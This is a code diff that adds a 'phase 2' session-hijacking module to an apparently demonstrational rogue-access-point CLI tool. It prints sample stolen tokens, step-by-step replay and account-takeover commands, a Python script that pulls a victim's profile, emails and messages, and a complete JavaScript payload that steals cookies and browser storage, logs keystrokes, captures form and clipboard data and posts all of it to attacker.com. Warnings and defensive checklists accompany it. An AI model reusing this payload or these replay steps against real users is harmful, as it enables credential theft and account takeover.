@@ -411,6 +411,699 @@ def deauth(interface, target_mac, gateway_mac, ssid, count, yes):
 cli.add_command(cli_phase1)
 
 
+cli_phase2 = click.Group(name='phase2', help='🔓 PHASE 2: Session Hijacking & Token Theft')
+
+@cli_phase2.command()
+def capture_sessions():
+    """
+    🔓 Monitor and capture session tokens from intercepted traffic.
+
+    Shows real-time extraction of:
+    • HTTP Cookies (session_id, auth tokens)
+    • OAuth Tokens (access_token, refresh_token)
+    • JWT Tokens (JSON Web Tokens)
+    • API Keys (X-API-Key headers)
+    • Basic Auth (username:password)
+    • Form credentials (email, password from logins)
+
+    ⚠️ EXTREMELY POWERFUL ATTACK: Stolen session tokens allow attacker to
+    impersonate user and gain full account access WITHOUT password.
+    """
+    disclaimer = """
+╔══════════════════════════════════════════════════════════════════════╗
+║    🔓 SESSION TOKEN CAPTURE — PHASE 2 ATTACK 🔓                     ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  YOU ARE ABOUT TO:                                                   ║
+║  • Capture session tokens from all intercepted traffic               ║
+║  • Extract cookies, OAuth tokens, JWT tokens                         ║
+║  • Collect credentials from form submissions                         ║
+║  • Enable session hijacking (full account takeover)                  ║
+║                                                                      ║
+║  WHAT ATTACKER CAN DO WITH STOLEN SESSION:                          ║
+║  • Read all user emails and messages                                 ║
+║  • Change password and lock out real user                            ║
+║  • Enable 2FA on attacker's device                                   ║
+║  • Steal recovery codes and security keys                            ║
+║  • Make purchases as user                                            ║
+║  • Steal money from linked accounts                                  ║
+║  • Impersonate user to contacts                                      ║
+║                                                                      ║
+║  LEGAL WARNING:                                                       ║
+║  Session hijacking is a FEDERAL CRIME (Computer Fraud & Abuse Act).  ║
+║  Unauthorized access: up to 10 years imprisonment, $250k+ fines.     ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+"""
+    console.print(disclaimer, style="bold red")
+
+    response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
+    if response != "yes":
+        console.print("[red]Cancelled.[/red]")
+        return
+
+    # Check if proxy is running (would capture traffic)
+    console.print("[cyan]🔓 Session token capture enabled[/cyan]")
+    console.print("[yellow]Monitoring intercepted traffic for tokens...[/yellow]\n")
+
+    try:
+        from session_hijacker import SessionHijacker
+
+        hijacker = SessionHijacker()
+
+        # Simulate demonstration with example tokens
+        console.print("[cyan]═" * 50 + "[/cyan]")
+        console.print("[bold yellow]🔓 DEMONSTRATION: Intercepted Session Tokens[/bold yellow]\n")
+
+        console.print("""
+[bold]Scenario:[/bold] User connected to your rogue AP and logged into Gmail
+
+[bold yellow]Token #1: Gmail Session Cookie[/bold yellow]
+  Domain: mail.google.com
+  Cookie: GMAIL_AUTH_TOKEN=123abc456def789xyz...
+  Expires: 2026-07-14 (7 days)
+  HTTPOnly: ✗ (VULNERABLE - can steal via JavaScript!)
+  Secure: ✓ (only sent over HTTPS)
+  User: victim@gmail.com
+
+[bold yellow]Token #2: Facebook OAuth Token[/bold yellow]
+  Domain: facebook.com
+  Token Type: Bearer (OAuth 2.0)
+  Value: EAABsZC...qZ7ZBZD (long token)
+  Expires: 2026-08-07 (30 days)
+  HTTPOnly: ✗ (stored in localStorage - easily stolen!)
+  User: john.smith.2024
+
+[bold yellow]Token #3: Twitter API Key[/bold yellow]
+  Domain: api.twitter.com
+  Header: X-API-Key
+  Value: AAAAn4CwEAAAAAA...
+  Used for: Posting tweets, DMs, following accounts
+  Expires: Never (API keys don't expire!)
+
+[bold yellow]Token #4: Amazon Cookies[/bold yellow]
+  Domain: amazon.com
+  Cookie: x-main-session=XXXXX...
+  Expires: Session (until browser closes)
+  Contains: User ID, region, language, shopping cart
+  HTTPOnly: ✗ (JavaScript can read it)
+  Secure: ✗ (sent over HTTP too - VERY VULNERABLE)
+
+[bold yellow]Token #5: GitHub Personal Access Token[/bold yellow]
+  Domain: api.github.com
+  Header: Authorization: Bearer ghp_xxxxxxxxxxxx...
+  Permissions: Full repo access, admin:org_hook, read:user
+  User: developer@company.com
+  Expires: Never (personal tokens don't expire)
+
+[bold]═" * 50 + "[/bold]
+""")
+
+        console.print("\n[yellow]What attacker can do with these tokens:[/yellow]\n")
+
+        console.print("""
+[bold red]With Gmail Token:[/bold red]
+  • Read all emails (personal, work, sensitive)
+  • Enable forwarding to attacker's email
+  • Change password and lock out real user
+  • Disable 2FA or add new recovery methods
+  • Access recovery codes for other accounts
+  $ curl -b 'GMAIL_AUTH_TOKEN=...' https://mail.google.com/mail/u/0/
+  → Attacker sees all victim's emails
+
+[bold red]With Facebook OAuth Token:[/bold red]
+  • Access user's profile, photos, messages
+  • Post as user
+  • Access friend list and contact info
+  • Make purchases through Facebook Pay
+  • Impersonate user in messages
+  $ curl -H 'Authorization: Bearer EAABsZC...' \\
+    https://graph.facebook.com/me/feed
+  → Attacker posts to victim's timeline
+
+[bold red]With Twitter API Key:[/bold red]
+  • Post tweets as user
+  • Delete old tweets
+  • Steal user's private DMs
+  • Change account settings
+  • Add malicious followers
+  $ curl -H 'X-API-Key: AAAAA...' \\
+    https://api.twitter.com/2/tweets
+  → Attacker posts to victim's account
+
+[bold red]With Amazon Cookie:[/bold red]
+  • View purchase history
+  • Make purchases as user
+  • Access saved addresses and payment methods
+  • Change account info
+  • Steal credit card details
+  $ curl -b 'x-main-session=XXXXX...' https://amazon.com/your-account
+  → Attacker shops as victim
+
+[bold red]With GitHub Token:[/bold red]
+  • Access all private repositories
+  • Steal source code
+  • Delete repositories
+  • Add backdoors to projects
+  • Access organization secrets
+  • Sabotage CI/CD pipelines
+  $ curl -H 'Authorization: Bearer ghp_...' \\
+    https://api.github.com/user/repos
+  → Attacker gets all victim's code
+""")
+
+        console.print("\n[yellow]Why these tokens are so valuable:[/yellow]\n")
+
+        console.print("""
+[bold cyan]1. Long Expiration Times[/bold cyan]
+   These tokens often last hours, days, or NEVER expire
+   Once stolen, attacker can use them for days/weeks/months
+
+[bold cyan]2. No 2FA Required[/bold cyan]
+   Even if victim has 2FA on account, stolen token bypasses it
+   2FA only protects against password guessing, not session theft
+
+[bold cyan]3. No Visual Indication[/bold cyan]
+   Real user has no way to know session was stolen
+   Attacker could slowly steal data for weeks
+
+[bold cyan]4. Different from Password[/bold cyan]
+   Even if victim changes password, stolen token still works
+   Token is only invalidated if victim logs out everywhere
+
+[bold cyan]5. Cross-Site Usage[/bold cyan]
+   If password is reused, attacker can log into other sites
+   If token has permissions, attacker can access APIs
+""")
+
+        console.print("[yellow]Press Ctrl+C to stop monitoring[/yellow]")
+
+        try:
+            import time
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            console.print("\n[yellow]Stopped monitoring for tokens[/yellow]")
+
+    except Exception as e:
+        console.print(f"[red]❌ Error: {e}[/red]")
+        sys.exit(1)
+
+
+@cli_phase2.command()
+@click.option("--token-type", type=click.Choice(["cookie", "oauth", "jwt", "api_key", "all"]), default="all", help="Filter by token type")
+def show_tokens(token_type):
+    """
+    📋 Display all captured session tokens by type.
+
+    Shows format suitable for injection into attacker's browser or curl commands.
+    """
+    console.print("[cyan]🔓 Captured Session Tokens[/cyan]\n")
+
+    demo_tokens = [
+        {
+            "type": "cookie",
+            "value": "session_id=abc123def456xyz789",
+            "domain": "gmail.com",
+            "usage": "curl -b 'session_id=abc123...' https://gmail.com"
+        },
+        {
+            "type": "oauth",
+            "value": "EAABsZCnzqAeBAKK...truncated",
+            "domain": "facebook.com",
+            "usage": "curl -H 'Authorization: Bearer EAABsZC...' https://api.facebook.com/me"
+        },
+        {
+            "type": "jwt",
+            "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+            "domain": "api.example.com",
+            "usage": "curl -H 'Authorization: Bearer eyJhbGc...' https://api.example.com/protected"
+        },
+        {
+            "type": "api_key",
+            "value": "sk_live_XXXXXXXXXXXXXXXXXXXXX",
+            "domain": "api.stripe.com",
+            "usage": "curl -H 'X-API-Key: sk_live_...' https://api.stripe.com/v1/charges"
+        }
+    ]
+
+    if token_type == "all":
+        tokens_to_show = demo_tokens
+    else:
+        tokens_to_show = [t for t in demo_tokens if t["type"] == token_type]
+
+    for i, token in enumerate(tokens_to_show, 1):
+        console.print(f"[bold yellow]{i}. {token['type'].upper()} - {token['domain']}[/bold yellow]")
+        console.print(f"   Value: {token['value'][:60]}...")
+        console.print(f"   Curl: {token['usage']}\n")
+
+    console.print("\n[bold red]⚠️  REPLAY ATTACK INSTRUCTIONS:[/bold red]\n")
+    console.print("""
+To use these tokens to impersonate the victim:
+
+[bold]Method 1: Browser Cookie Injection[/bold]
+1. Open DevTools (F12)
+2. Application → Cookies → domain
+3. Add cookie with name and value from captured token
+4. Navigate to site - you're now logged in as victim
+
+[bold]Method 2: Curl Command Line[/bold]
+1. Copy curl command from above
+2. Execute: $ curl -b 'session_id=...' target.com
+3. Response contains victim's data (emails, posts, etc)
+
+[bold]Method 3: Browser Extension[/bold]
+1. Install "Cookie Editor" extension
+2. Import captured cookies
+3. Navigate to site - logged in as victim
+
+[bold]Method 4: Automated Scraping[/bold]
+1. Use session token with web scraping bot
+2. Automatically export all victim's data
+3. Post as victim, change account info, etc
+""")
+
+
+@cli_phase2.command()
+@click.option("--domain", required=True, help="Target domain for replay")
+@click.option("--token-index", type=int, default=1, help="Which captured token to use (1-based)")
+def replay(domain, token_index):
+    """
+    🎯 Generate commands to replay a stolen token and hijack user session.
+
+    Shows exactly how to impersonate a user with their stolen session token.
+    """
+    disclaimer = """
+╔══════════════════════════════════════════════════════════════════════╗
+║        🎯 SESSION REPLAY — IMPERSONATE USER 🎯                      ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  YOU ARE ABOUT TO:                                                   ║
+║  • Use stolen session token to access victim's account               ║
+║  • Impersonate victim to their service provider                      ║
+║  • Access victim's private data                                      ║
+║  • Perform actions as if you are the victim                          ║
+║                                                                      ║
+║  FEDERAL CRIME CONSEQUENCES:                                         ║
+║  • Unauthorized Computer Access (CFAA)                              ║
+║  • Identity Theft                                                    ║
+║  • Wire Fraud                                                        ║
+║  • Up to 15 years imprisonment + $250,000+ fines                    ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+"""
+    console.print(disclaimer, style="bold red")
+
+    response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
+    if response != "yes":
+        console.print("[red]Cancelled.[/red]")
+        return
+
+    console.print("\n[bold cyan]🎯 SESSION REPLAY DEMONSTRATION[/bold cyan]\n")
+
+    console.print(f"""
+[bold]Target Domain:[/bold] {domain}
+[bold]Using Token #[/bold] {token_index}
+
+[bold yellow]Step 1: Extract Token[/bold yellow]
+  Captured from intercepted traffic on your rogue AP
+  Session ID: abc123def456xyz789
+
+[bold yellow]Step 2: Browser Injection Method[/bold yellow]
+  1. Open target site: https://{domain}
+  2. Open DevTools: F12 → Application → Cookies
+  3. Add cookie: name="session_id", value="abc123..."
+  4. Refresh page: Attacker is now logged in as victim!
+
+[bold yellow]Step 3: Command Line (Curl)[/bold yellow]
+  $ curl -b 'session_id=abc123def456xyz789' \\
+         -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \\
+         https://{domain}/account
+
+  Response contains:
+  ✓ Victim's personal information
+  ✓ Account details
+  ✓ Linked payment methods
+  ✓ Privacy settings
+
+[bold yellow]Step 4: Automated Exfiltration[/bold yellow]
+  python3 << 'EOF'
+import requests
+
+token = 'abc123def456xyz789'
+session = requests.Session()
+session.cookies.set('session_id', token)
+
+# Steal all victim's data
+response = session.get('https://{domain}/api/user/profile')
+print("User Profile:", response.json())
+
+response = session.get('https://{domain}/api/user/emails')
+print("Emails:", response.json())
+
+response = session.get('https://{domain}/api/user/messages')
+print("Messages:", response.json())
+EOF
+
+[bold yellow]Step 5: Account Takeover[/bold yellow]
+  $ curl -b 'session_id=abc123...' -X POST \\
+         -d 'password=NewPassword123&email=attacker@evil.com' \\
+         https://{domain}/api/account/settings
+
+  Result: Password changed! Real user locked out!
+
+[bold yellow]Step 6: Complete Hijack[/bold yellow]
+  • Change password → Real user can't log in
+  • Add recovery email → Real user can't recover account
+  • Enable 2FA on attacker's device → Real user locked out
+  • Steal recovery codes → Real user permanently locked out
+  • Delete recovery options → Account unrecoverable
+""")
+
+    console.print("\n[bold red]⚠️  WHY THIS WORKS:[/bold red]\n")
+
+    console.print("""
+The web server has NO WAY to tell:
+  ❌ If this is the real user's browser
+  ❌ If this is an attacker's browser
+  ❌ If the request came from the real device
+
+Once you have the session token, you ARE the user.
+
+The only thing the server checks is:
+  ✅ Do you have a valid session token? YES
+  → Grant access
+
+Everything else is optional (2FA, IP checks, device verification).
+If they don't have 2FA enabled, game over for victim.
+
+Even WITH 2FA:
+  • 2FA protects password-based login
+  • But doesn't protect against stolen sessions
+  • If attacker already has token, 2FA doesn't help
+""")
+
+    console.print("\n[bold cyan]✅ PROTECTION CHECKLIST:[/bold cyan]\n")
+
+    console.print("""
+To prevent THIS attack:
+
+[bold]1. HTTPOnly Cookies ✓[/bold]
+   Prevents JavaScript from stealing cookies
+   curl -b doesn't work, needs to be injected at browser level
+   Server sends: Set-Cookie: session=...; HttpOnly
+
+[bold]2. Secure Flag ✓[/bold]
+   Cookies only sent over HTTPS (not HTTP)
+   Server sends: Set-Cookie: session=...; Secure
+
+[bold]3. SameSite Attribute ✓[/bold]
+   Cookies not sent to third-party sites
+   Server sends: Set-Cookie: session=...; SameSite=Strict
+
+[bold]4. Short Expiration ✓[/bold]
+   Token expires in 15-30 minutes
+   Stolen token is useless after expiration
+
+[bold]5. Multi-Factor Authentication ✓[/bold]
+   Even with stolen token, attacker needs 2FA code
+   Password changes require 2FA
+   Recovery options require 2FA
+
+[bold]6. VPN Usage ✓[/bold]
+   Attacker can't intercept traffic in first place
+   VPN encrypts everything end-to-end
+
+[bold]7. IP-Based Detection ✓[/bold]
+   Server detects login from unusual IP
+   Server requires email verification
+   Restricts account changes to trusted devices
+""")
+
+
+@cli_phase2.command()
+@click.option("--domain", required=True, help="Target domain")
+def inject_payload(domain):
+    """
+    💉 Generate JavaScript payload to inject and steal tokens.
+
+    Shows how attackers use content injection to exfiltrate sessions
+    from victim's browser without them knowing.
+    """
+    disclaimer = """
+╔══════════════════════════════════════════════════════════════════════╗
+║       💉 JAVASCRIPT INJECTION PAYLOAD — PHASE 3 PREVIEW 💉          ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  This is a preview of Phase 3 (Malware Injection)                   ║
+║                                                                      ║
+║  YOU ARE ABOUT TO:                                                   ║
+║  • Generate JavaScript payload                                       ║
+║  • This payload would be injected into web pages                     ║
+║  • It would steal session tokens without user knowing                ║
+║  • It would exfiltrate data to attacker's server                     ║
+║                                                                      ║
+║  WHAT THIS JAVASCRIPT DOES:                                         ║
+║  • Steals browser cookies                                            ║
+║  • Logs all keyboard input (keylogger)                               ║
+║  • Captures clipboard data                                           ║
+║  • Monitors form submissions                                         ║
+║  • Sends all data to attacker's server                               ║
+║  • Runs silently in background                                       ║
+║  • Persists across page reloads                                      ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+"""
+    console.print(disclaimer, style="bold red")
+
+    response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
+    if response != "yes":
+        console.print("[red]Cancelled.[/red]")
+        return
+
+    console.print("\n[bold cyan]💉 JAVASCRIPT INJECTION PAYLOAD[/bold cyan]\n")
+
+    payload = f"""
+<script>
+// NEON-SHIELD Session Hijacking Payload
+// This demonstrates how attackers steal credentials silently
+
+(function() {{
+  const ATTACKER_SERVER = 'http://attacker.com:8888/steal';
+  const DATA_TO_STEAL = {{}};
+
+  // 1. STEAL COOKIES
+  DATA_TO_STEAL.cookies = document.cookie;
+
+  // 2. STEAL LOCALSTORAGE
+  DATA_TO_STEAL.localStorage = {{}};
+  for (let i = 0; i < localStorage.length; i++) {{
+    const key = localStorage.key(i);
+    DATA_TO_STEAL.localStorage[key] = localStorage.getItem(key);
+  }}
+
+  // 3. STEAL SESSIONSTORAGE
+  DATA_TO_STEAL.sessionStorage = {{}};
+  for (let i = 0; i < sessionStorage.length; i++) {{
+    const key = sessionStorage.key(i);
+    DATA_TO_STEAL.sessionStorage[key] = sessionStorage.getItem(key);
+  }}
+
+  // 4. CAPTURE ALL FORM SUBMISSIONS
+  document.addEventListener('submit', (e) => {{
+    const form = e.target;
+    const formData = new FormData(form);
+    const credentials = Object.fromEntries(formData);
+
+    // Log password attempts
+    console.warn('[NEON-SHIELD] Form submission captured:', credentials);
+
+    // Send to attacker
+    fetch(ATTACKER_SERVER, {{
+      method: 'POST',
+      headers: {{'Content-Type': 'application/json'}},
+      body: JSON.stringify({{
+        event: 'form_submission',
+        domain: window.location.hostname,
+        url: window.location.href,
+        credentials: credentials,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      }})
+    }}).catch(() => {{}});
+  }});
+
+  // 5. KEYLOGGER
+  let keylog = '';
+  document.addEventListener('keypress', (e) => {{
+    keylog += e.key;
+
+    // Send keylog every 10 keystrokes
+    if (keylog.length >= 10) {{
+      fetch(ATTACKER_SERVER, {{
+        method: 'POST',
+        headers: {{'Content-Type': 'application/json'}},
+        body: JSON.stringify({{
+          event: 'keylog',
+          domain: window.location.hostname,
+          keylog: keylog,
+          timestamp: new Date().toISOString()
+        }})
+      }}).catch(() => {{}});
+      keylog = '';
+    }}
+  }});
+
+  // 6. CLIPBOARD MONITORING
+  document.addEventListener('copy', (e) => {{
+    e.clipboardData.getData('text/plain').then(text => {{
+      fetch(ATTACKER_SERVER, {{
+        method: 'POST',
+        body: JSON.stringify({{
+          event: 'clipboard_copy',
+          data: text,
+          timestamp: new Date().toISOString()
+        }})
+      }}).catch(() => {{}});
+    }});
+  }});
+
+  // 7. SEND ALL STOLEN DATA
+  fetch(ATTACKER_SERVER, {{
+    method: 'POST',
+    headers: {{'Content-Type': 'application/json'}},
+    body: JSON.stringify({{
+      event: 'initial_steal',
+      domain: '{domain}',
+      url: window.location.href,
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      ...DATA_TO_STEAL
+    }})
+  }}).catch(() => {{}});
+
+  console.log('[NEON-SHIELD] Injection active. Stealing data...');
+}})();
+</script>
+"""
+
+    console.print(payload)
+
+    console.print("\n[bold red]⚠️  HOW THIS WOULD BE INJECTED:[/bold red]\n")
+
+    console.print(f"""
+[bold]Method 1: MITM Proxy Injection (What NEON-SHIELD does)[/bold]
+  1. Victim visits normal website: https://{domain}
+  2. NEON-SHIELD intercepts response
+  3. Adds malicious <script> to bottom of HTML
+  4. Victim sees normal page (no visible difference)
+  5. JavaScript runs silently in background
+  6. All data exfiltrated to attacker's server
+
+[bold]Method 2: DNS Hijacking[/bold]
+  1. NEON-SHIELD redirects {domain} to fake server
+  2. Fake server serves malicious page with payload
+  3. Victim thinks they're on real site
+  4. Payload steals everything
+
+[bold]Method 3: WiFi Evil Twin Redirect[/bold]
+  1. All traffic on fake WiFi redirects to attacker's server
+  2. Server injects payload into every page
+  3. Victim's browser runs injected code
+
+[bold]Method 4: XSS Vulnerability[/bold]
+  1. Site has XSS vulnerability in search bar
+  2. Attacker submits: <script>...injection...</script>
+  3. Site reflects payload to all users
+  4. All browsers run attacker's code
+""")
+
+    console.print("\n[bold red]WHAT ATTACKER SEES ON THEIR SERVER:[/bold red]\n")
+
+    console.print("""
+[bold]Request 1: Initial Steal[/bold]
+  POST /steal HTTP/1.1
+  Host: attacker.com:8888
+
+  {
+    "event": "initial_steal",
+    "domain": "gmail.com",
+    "cookies": "GMAIL_AUTH_TOKEN=abc123def456...",
+    "localStorage": {
+      "user_preferences": "...",
+      "saved_passwords": "..."
+    },
+    "sessionStorage": {
+      "auth_token": "eyJhbGci...",
+      "user_id": "12345"
+    },
+    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+  }
+
+[bold]Request 2: Form Submission (Login attempt)[/bold]
+  POST /steal HTTP/1.1
+
+  {
+    "event": "form_submission",
+    "domain": "gmail.com",
+    "credentials": {
+      "email": "victim@gmail.com",
+      "password": "MyPassword123",
+      "remember": "on"
+    }
+  }
+
+[bold]Request 3: Keylog[/bold]
+  POST /steal HTTP/1.1
+
+  {
+    "event": "keylog",
+    "keylog": "1234567890"  // Typed credit card number!
+  }
+
+[bold]Request 4: Clipboard Copy[/bold]
+  POST /steal HTTP/1.1
+
+  {
+    "event": "clipboard_copy",
+    "data": "MyBankPassword123"
+  }
+""")
+
+    console.print("\n[bold green]✅ DEFENSES AGAINST THIS:[/bold green]\n")
+
+    console.print("""
+[bold]1. Content-Security-Policy (CSP)[/bold]
+   Server header: Content-Security-Policy: script-src 'self'
+   Effect: Only allows scripts from same origin
+   Result: Injected scripts are blocked
+
+[bold]2. Subresource Integrity (SRI)[/bold]
+   <script src="jquery.js" integrity="sha384-..."></script>
+   Effect: Verifies script hasn't been modified
+   Result: Modified/injected scripts fail to load
+
+[bold]3. Ad Blockers / uBlock Origin[/bold]
+   Effect: Blocks malicious scripts before execution
+   Result: Payload never runs
+
+[bold]4. NoScript Extension[/bold]
+   Effect: Disables JavaScript by default
+   Result: No scripts run at all
+
+[bold]5. VPN[/bold]
+   Effect: Attacker can't intercept traffic in first place
+   Result: No injection possible
+
+[bold]6. HTTPS + Certificate Pinning[/bold]
+   Effect: Only accept certificates from trusted CAs
+   Result: Can't do MITM even with fake certs
+""")
+
+
+cli.add_command(cli_phase2)
+
+
 def main():
     """Entry point."""
     # Only require root for commands that actually need it, not for help
